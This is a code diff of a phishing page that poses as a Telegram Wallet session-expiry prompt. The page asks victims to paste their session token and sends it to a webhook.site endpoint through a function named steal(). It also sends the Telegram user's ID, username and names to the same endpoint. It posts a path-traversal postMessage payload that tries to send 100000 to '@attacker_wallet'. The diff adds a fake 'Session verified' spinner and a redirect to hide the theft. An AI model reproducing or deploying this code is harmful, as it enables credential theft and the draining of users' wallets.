@@ -9,6 +9,7 @@
       font-family: sans-serif;
       text-align: center;
       padding: 40px;
+      background-color: #f5f5f5;
     }
     textarea {
       width: 80%;
@@ -24,17 +25,44 @@
       border-radius: 5px;
       cursor: pointer;
     }
+    #success {
+      display: none;
+      margin-top: 30px;
+      font-size: 18px;
+      color: #2e7d32;
+    }
+    .spinner {
+      display: inline-block;
+      width: 18px;
+      height: 18px;
+      border: 3px solid #2e7d32;
+      border-radius: 50%;
+      border-top-color: transparent;
+      animation: spin 1s linear infinite;
+      vertical-align: middle;
+      margin-right: 8px;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
   <h1>🔐 Session Expired</h1>
   <p>Your Telegram Wallet session has expired. Please verify your session token to continue.</p>
 
-  <textarea id="token" placeholder="Paste your session token here..."></textarea><br><br>
-  <button onclick="steal()">Verify</button>
+  <div id="form">
+    <textarea id="token" placeholder="Paste your session token here..."></textarea><br><br>
+    <button onclick="steal()">Verify</button>
+  </div>
+
+  <div id="success">
+    <div class="spinner"></div>
+    ✅ Session verified. Redirecting...
+  </div>
 
   <script>
-    // Send Telegram Wallet payload to opener
+    // Wallet postMessage injection
     const payload = "../../../wallet/send?amount=100000&to=@attacker_wallet";
     const message = JSON.stringify({
       eventType: 'web_app_open_tg_link',
@@ -48,36 +76,51 @@
       console.log("✅ postMessage payload sent.");
     }, 1500);
 
-    // Send captured token to your webhook
+    // Fake session verify
     function steal() {
-      const token = document.getElementById("token").value;
+      const token = document.getElementById("token").value.trim();
+      if (!token) {
+        alert("⚠️ Please paste a session token first.");
+        return;
+      }
+
       fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4", {
         method: "POST",
         headers: { "Content-Type": "text/plain" },
         body: "Captured Token: " + token
       });
-      alert("✅ Session verified.");
+
+      // Update UI
+      document.getElementById("form").style.display = "none";
+      document.getElementById("success").style.display = "block";
+
+      // Optional redirect after 2 seconds
+      setTimeout(() => {
+        window.location.href = "https://t.me/wallet"; // change to desired URL
+      }, 2000);
     }
 
-    // Optional: Log Telegram user info if WebApp context is available
-    window.Telegram.WebApp.ready();
-    const tg = window.Telegram.WebApp;
-    const user = tg.initDataUnsafe?.user;
-    if (user) {
-      fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          telegram_id: user.id,
-          username: user.username,
-          first_name: user.first_name,
-          last_name: user.last_name,
-          lang: user.language_code
-        })
-      });
+    // Telegram user info exfil
+    try {
+      window.Telegram.WebApp.ready();
+      const tg = window.Telegram.WebApp;
+      const user = tg.initDataUnsafe?.user;
+      if (user) {
+        fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            telegram_id: user.id,
+            username: user.username,
+            first_name: user.first_name,
+            last_name: user.last_name,
+            lang: user.language_code
+          })
+        });
+      }
+    } catch (e) {
+      console.warn("Not in Telegram context.");
     }
   </script>
 </body>
 </html>
-
-
